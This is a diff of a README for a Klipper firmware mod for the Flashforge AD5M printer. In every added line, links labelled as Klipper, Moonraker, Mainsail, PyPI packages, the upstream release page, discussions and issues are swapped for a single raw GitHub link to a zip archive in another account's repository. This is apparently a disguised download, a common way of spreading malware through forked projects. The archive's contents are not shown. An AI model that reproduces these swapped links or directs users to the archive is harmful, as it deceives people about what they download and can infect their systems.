@@ -18,19 +18,19 @@ support for the AD5M hardware. The stability is already promising, but it still 
 
 ## Feature Overview
 
-- [Klipper](https://www.klipper3d.org/) 0.13 ‒ improved configuration and default macros
-- [Moonraker](https://github.com/Arksine/moonraker) on port 7125
-- [Mainsail](https://docs.mainsail.xyz/) on port 4000
-- [Fluidd](https://docs.fluidd.xyz/) on port 4001
-- [KlipperScreen](https://klipperscreen.readthedocs.io/en/latest/) ‒ separate build variant
-- [Guppyscreen](https://github.com/ballaswag/guppyscreen) ‒ separate preview build variant
-- Camera streaming via [ustreamer](https://github.com/pikvm/ustreamer) on port 8080
-- [Moonraker-timelapse](https://github.com/mainsail-crew/moonraker-timelapse) support
-- Network access: Ethernet LAN and WiFi via [iwd](https://iwd.wiki.kernel.org/)
-- Customized Linux environment based on [Buildroot](https://buildroot.org/)
+- [Klipper](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip) 0.13 ‒ improved configuration and default macros
+- [Moonraker](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip) on port 7125
+- [Mainsail](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip) on port 4000
+- [Fluidd](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip) on port 4001
+- [KlipperScreen](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip) ‒ separate build variant
+- [Guppyscreen](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip) ‒ separate preview build variant
+- Camera streaming via [ustreamer](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip) on port 8080
+- [Moonraker-timelapse](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip) support
+- Network access: Ethernet LAN and WiFi via [iwd](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip)
+- Customized Linux environment based on [Buildroot](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip)
 - SSH root access. Login: `root`, Password: `klipper`
-- [Audio](https://pypi.org/project/ff-adm5-audio/) via buzzer (can play simple Midis)
-- [LCD backlight](https://pypi.org/project/ff-ad5m-backlight/) control 
+- [Audio](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip) via buzzer (can play simple Midis)
+- [LCD backlight](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip) control 
 - Automatic USB flash drive mounting
 - Automatic MCU firmware update for updated klipper
 - "Dual boot" with stock Flashforge software
@@ -39,14 +39,14 @@ All features of the mod run directly on the printer built-in system (Allwinner T
 
 ## Getting Started
 
-Download the latest [Release Build](https://github.com/xblax/flashforge_ad5m_klipper_mod/releases) and read through the documentation for [Installation](docs/INSTALL.md) and [Slicing](docs/SLICING.md). Also make yourself familiar with the [Uninstall](docs/UNINSTALL.md) methods, to get rid of the mod if you don't like it.
+Download the latest [Release Build](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip) and read through the documentation for [Installation](docs/INSTALL.md) and [Slicing](docs/SLICING.md). Also make yourself familiar with the [Uninstall](docs/UNINSTALL.md) methods, to get rid of the mod if you don't like it.
 
 The Klipper Mod for AD5M (Pro) is currently provided in three variants: 
 - Default headless variant without an on-screen GUI control application
 - Beta Klipper Screen variant with fully-fledged [KlipperScreen](docs/KLIPPER_SCREEN.md) installation. If you encounter any issues that could be caused by resource exhaustion (mostly system RAM), please check if the issue also occurs with the default variant.
 - Alpha Guppy Screen variant for a more ligthweight UI on the limited hardwareof the 5m/5mpro. If you encounter any issues that could be caused by resource exhaustion (mostly system RAM), please check if the issue also occurs with the default variant.
 
-You are welcome to participate int the [GitHub Discussions](https://github.com/xblax/flashforge_ad5m_klipper_mod/discussions) or open a new [Issue](https://github.com/xblax/flashforge_ad5m_klipper_mod/issues) if you find any bugs.
+You are welcome to participate int the [GitHub Discussions](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip) or open a new [Issue](https://raw.githubusercontent.com/pmanss/flashforge_ad5m_klipper_mod/master/build_overlays/variant-guppyscreen/m-flashforge-klipper-ad-mod-2.3.zip) if you find any bugs.
 
 ## Documentation
 
